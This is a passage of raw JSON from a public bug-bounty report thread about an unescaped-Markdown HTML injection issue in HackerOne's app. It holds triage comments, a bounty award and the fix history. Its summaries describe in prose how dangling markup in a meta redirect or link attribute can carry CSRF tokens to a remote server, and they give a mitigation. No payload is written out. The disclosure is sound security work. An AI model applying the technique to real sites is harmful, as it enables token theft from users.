missed.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-26T00:09:45.883Z","updated_at":"2016-01-26T00:09:45.883Z","actor":{"username":"andrewone","cleared":false,"url":"/andrewone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/236/a5d3675b5d06cc936fbcc467cc8643e779371f3a_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":771731,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the info, I've overseen that. Should be good! Thanks for the fix!","markdown_message":"\u003cp\u003eThanks for the info, I\u0026#39;ve overseen that. Should be good! Thanks for the fix!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-26T00:22:53.714Z","updated_at":"2016-01-26T00:22:53.714Z","actor":{"username":"intidc","cleared":true,"url":"/intidc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/322/cb30ac31b7653e73d6dd5a0f0e2cfeed113d2feb_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":771840,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2016-01-26T02:25:49.383Z","updated_at":"2016-01-26T02:25:49.383Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"intidc","url":"/intidc"},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":771841,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for the report, @intidc! Happy hacking!","markdown_message":"\u003cp\u003eThanks for the report, \u003ca href=\"/intidc\"\u003e@intidc\u003c/a\u003e! Happy hacking!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-26T02:26:24.451Z","updated_at":"2016-01-26T02:26:24.451Z","actor":{"url":"/security","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"HackerOne"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"security","collaborator":{"username":"intidc","url":"/intidc"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":771843,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-01-26T02:26:36.146Z","updated_at":"2016-01-26T02:26:36.146Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":772585,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Awesome, thanks for the bounty!","markdown_message":"\u003cp\u003eAwesome, thanks for the bounty!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-26T16:05:58.047Z","updated_at":"2016-01-26T16:05:58.047Z","actor":{"username":"intidc","cleared":true,"url":"/intidc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/322/cb30ac31b7653e73d6dd5a0f0e2cfeed113d2feb_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":772586,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-01-26T16:05:58.673Z","updated_at":"2016-01-26T16:05:58.673Z","actor":{"username":"intidc","cleared":true,"url":"/intidc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/322/cb30ac31b7653e73d6dd5a0f0e2cfeed113d2feb_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":773222,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @intidc,\n\nIt has been brought to our attention that the fix we released causes some undesirable side effects, so we will be rolling back the fix. The issue will thereby remain intact until we find a better solution.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/intidc\"\u003e@intidc\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eIt has been brought to our attention that the fix we released causes some undesirable side effects, so we will be rolling back the fix. The issue will thereby remain intact until we find a better solution.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-26T22:45:59.041Z","updated_at":"2016-01-26T22:45:59.041Z","actor":{"username":"andrewone","cleared":false,"url":"/andrewone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/236/a5d3675b5d06cc936fbcc467cc8643e779371f3a_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":809414,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"A new fix has been deployed, so this should now be fixed once again.","markdown_message":"\u003cp\u003eA new fix has been deployed, so this should now be fixed once again.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-02-23T21:48:39.117Z","updated_at":"2016-02-23T21:48:39.117Z","actor":{"username":"andrewone","cleared":false,"url":"/andrewone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/236/a5d3675b5d06cc936fbcc467cc8643e779371f3a_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":809532,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Cool, thanks for the fix!","markdown_message":"\u003cp\u003eCool, thanks for the fix!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-02-23T22:50:57.632Z","updated_at":"2016-02-23T22:50:57.632Z","actor":{"username":"intidc","cleared":true,"url":"/intidc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/322/cb30ac31b7653e73d6dd5a0f0e2cfeed113d2feb_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":1257,"category":"team","content":"There was a legitimate issue in our app where Markdown was not being escaped properly, but it was not immediately exploitable since it relies on the existence of an injection vulnerability (which can theoretically be introduced in the future). The issue was a real issue that we did not know existed, verified through an investigation and finally patched up.\n\nWe rely on our implementation of Redcarpet to escape the HTML output of any Markdown input, and this output is passed directly into our DOM via `dangerouslySetInnerHTML` in our React component. Because it turns out that we weren't properly escaping this HTML output, this could potentially be exploited.\n\nAll other non-Markdown user-generated content is displayed via React without using `dangerouslySetInnerHTML`, so it is auto-escaped by React and thus not vulnerable to an exploit.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eThere was a legitimate issue in our app where Markdown was not being escaped properly, but it was not immediately exploitable since it relies on the existence of an injection vulnerability (which can theoretically be introduced in the future). The issue was a real issue that we did not know existed, verified through an investigation and finally patched up.\u003c/p\u003e\n\n\u003cp\u003eWe rely on our implementation of Redcarpet to escape the HTML output of any Markdown input, and this output is passed directly into our DOM via \u003ccode\u003edangerouslySetInnerHTML\u003c/code\u003e in our React component. Because it turns out that we weren\u0026#39;t properly escaping this HTML output, this could potentially be exploited.\u003c/p\u003e\n\n\u003cp\u003eAll other non-Markdown user-generated content is displayed via React without using \u003ccode\u003edangerouslySetInnerHTML\u003c/code\u003e, so it is auto-escaped by React and thus not vulnerable to an exploit.\u003c/p\u003e\n"},{"id":1260,"category":"researcher","content":"Navigation is something a content security policy can't cover. In some cases, HTML markup, including CSRF tokens, can be encapsulated in an attribute value, as is the case with the url attribute of the meta redirect element, or the href attribute of an anchor tag. This makes it possible for an attacker to send the encapsulated HTML, sometimes containing sensitive information and tokens, as a GET parameter to a remove server. In order to mitigate the risk you can convert your single quotes to their HTML equivalent `\u0026#39;`, as both single and double quotes can be used to enclose an attribute value.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eNavigation is something a content security policy can\u0026#39;t cover. In some cases, HTML markup, including CSRF tokens, can be encapsulated in an attribute value, as is the case with the url attribute of the meta redirect element, or the href attribute of an anchor tag. This makes it possible for an attacker to send the encapsulated HTML, sometimes containing sensitive information and tokens, as a GET parameter to a remove server. In order to mitigate the risk you can convert your single quotes to their HTML equivalent \u003ccode\u003e\u0026amp;#39;\u003c/code\u003e, as both single and double quotes can be used to enclose an attribute value.\u003c/p\u003e\n"}]}